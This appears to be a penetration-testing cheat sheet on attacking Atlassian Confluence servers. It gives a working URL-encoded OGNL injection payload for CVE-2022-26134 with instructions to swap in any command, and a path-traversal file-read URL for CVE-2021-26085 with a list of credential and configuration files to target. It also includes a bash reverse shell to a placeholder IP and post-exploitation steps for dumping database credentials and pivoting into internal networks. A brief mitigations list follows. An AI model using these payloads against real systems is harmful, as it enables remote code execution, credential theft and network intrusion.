## 1. Overview

Confluence is a web-based collaboration platform by Atlassian. When testing Confluence instances, you're looking for:

- **Version detection** → CVE hunting
- **Authentication bypasses**
- **Remote Code Execution (RCE)**
- **Arbitrary File Read**
- **OGNL injection vulnerabilities**

### Quick Detection Method

**Test endpoint:**

```
https://example.com/login.action?os_destination=%2F
```

**Look for:**

- Confluence login form
- Version number in source code: `<meta name="ajs-version-number" content="X.X.X">`

---

## 2. Exploitation Methods

### Step 1: Version Detection

**Check the page source** at `/login.action?os_destination=%2F`

Find this meta tag:

```html
<meta name="ajs-version-number" content="8.20.9">
```

**Cross-reference CVEs:**

- Visit [CVEDetails - Atlassian Confluence](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-6258/Atlassian-Confluence.html)
- Match version to known vulnerabilities

---

### Step 2: Test for Known CVEs

#### 🔥 CVE-2022-26134 - Remote Code Execution

**Impact:** Critical RCE via OGNL injection

**Affected versions:** Confluence Server/Data Center < 7.4.17, 7.13.0-7.13.7, 7.14.0-7.14.3, 7.15.0-7.15.2, 7.16.0-7.16.4, 7.17.0-7.17.4, 7.18.0-7.18.1

**Exploit:**

```
https://example.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```

**What it does:**

- Executes `whoami` command
- Returns output in `X-Cmd-Response` header

**How to test:**

1. Send GET request to the payload above
2. Check response headers for `X-Cmd-Response`
3. If present → RCE confirmed

**Custom command injection:** Replace `whoami` with your command in the URL-encoded payload.

---

#### 📂 CVE-2021-26085 - Arbitrary File Read

**Impact:** Read sensitive files from server

**Affected versions:** Confluence Server/Data Center < 6.13.23, 7.0.0-7.0.5, 7.1.0-7.1.9, 7.2.0-7.2.9, 7.3.0-7.3.5, 7.4.0-7.4.11, 7.5.0-7.5.8, 7.6.0-7.6.13, 7.7.0-7.7.8, 7.8.0-7.8.10, 7.9.0-7.9.5, 7.10.0-7.10.5, 7.11.0-7.11.6, 7.12.0-7.12.5

**Exploit:**

```
https://example.com/s/test/_/;/WEB-INF/web.xml
```

**What it does:**

- Bypasses path traversal restrictions
- Reads `WEB-INF/web.xml` (contains config, DB creds)

**High-value targets to read:**

```
/WEB-INF/web.xml
/WEB-INF/classes/confluence-init.properties
/WEB-INF/classes/seraph-config.xml
/WEB-INF/atlassian-bundled-plugins/confluence-core-*.jar
```

**How to test:**

1. Replace `web.xml` with target file
2. Check if file contents are returned
3. Try different paths if blocked

---

## 3. Higher Impact Scenarios

### 🎯 RCE → Full Server Takeover

**After exploiting CVE-2022-26134:**

1. **Reverse shell:**

```bash
# Replace IP and PORT
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
```

2. **Dump database credentials:**
    
    - Read `/var/atlassian/application-data/confluence/confluence.cfg.xml`
    - Extract JDBC connection strings
3. **Pivot to internal network:**
    
    - Confluence often has access to internal services
    - Use as stepping stone for lateral movement

---

### 🔓 File Read → Credential Extraction

**After exploiting CVE-2021-26085:**

1. **Read database config:**

```
/WEB-INF/classes/confluence-init.properties
```

2. **Extract admin session tokens:**

```
/WEB-INF/classes/seraph-config.xml
```

3. **Read backup files:**

```
/backups/
/temp/
```

---

## 4. Mitigations (For Defenders)

- ✅ **Always update Confluence to latest version**
- ✅ **Restrict access to admin panels** (IP whitelist)
- ✅ **Implement WAF rules** for OGNL patterns
- ✅ **Monitor for unusual requests** to `/WEB-INF/` paths
- ✅ **Disable unnecessary plugins**
- ✅ **Regular security audits** of Confluence instances

---

## Quick Reference Card

|CVE|Impact|Quick Test|
|---|---|---|
|CVE-2022-26134|RCE|Check for `X-Cmd-Response` header|
|CVE-2021-26085|File Read|Try `/s/test/_/;/WEB-INF/web.xml`|

**Version Detection:**

```bash
curl -s "https://target.com/login.action" | grep -oP 'ajs-version-number" content="\K[^"]*'
```

---

**🎯 Pro tip:** Always check `/rest/api/space` and `/rest/api/user/current` for unauthenticated API access after finding a Confluence instance.